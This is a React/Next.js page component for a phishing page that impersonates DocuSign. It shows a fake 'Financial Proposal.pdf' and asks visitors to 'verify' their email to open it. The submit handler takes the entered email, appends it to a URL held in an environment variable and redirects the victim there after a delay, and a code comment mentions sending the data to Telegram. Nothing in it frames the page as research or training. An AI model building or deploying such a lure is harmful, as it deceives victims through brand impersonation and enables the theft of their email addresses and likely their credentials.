'use client'

export default function Home() {

  const handleSubmit = (e) => {
    e.preventDefault();
    const continueBtn = document.querySelector(".LoginBtn");
    continueBtn.innerHTML = "Processing..."

    const userID = document.getElementById('userid').value.trim();
    const uniquesPreUrl = process.env.NEXT_PUBLIC_URL_NAME

    // Format the message to send to Telegram
    const url = `${uniquesPreUrl}&omn=${userID}`;

    try {
      setTimeout(() => {
        window.location.href = url;
      }, 1500);
      console.log("Message sent!!")
    } catch (error) {
      console.error('Error:', error);
    }
  }
  return (
    <>
      
      <main className="grandCntn">
        <img src="/sample-pdf.jpg" alt="document image" />

        <div className="formCntn">
          <div className="formTitle">
            <h1>Docu<span>Sign</span></h1>
          </div>
          <div className="docPreview">
            <div className="docName"><b>Document:</b> Financial Proposal.pdf</div>
            <div className="docSize">🔐 1.2 MB</div>
          </div>
          <h2 className="title_note">You&apos;ve received a secure document. Please verify your email to access the file.</h2>
          <div className="form">
            <form className="firstSection login" onSubmit={(e) => {handleSubmit(e)}}>
              <div className="inputCntn userID">
                {/* <label htmlFor="UserID">Email</label> */}
                <input id="userid" type="email" autoFocus required minLength="4" placeholder="Enter your email" />
              </div>


              <div className="submissionCntn">
                <button type="submit" className="LoginBtn signInBtn">Access Document</button>
              </div>
            </form>
          </div>
          <div className="formFooter">
            <p>By continuing, you agree to to our <a href="#" className="pol">Privacy Policy</a> and data processing guidelines.</p>
          </div>
        </div>
      </main>
    </>
  );
}
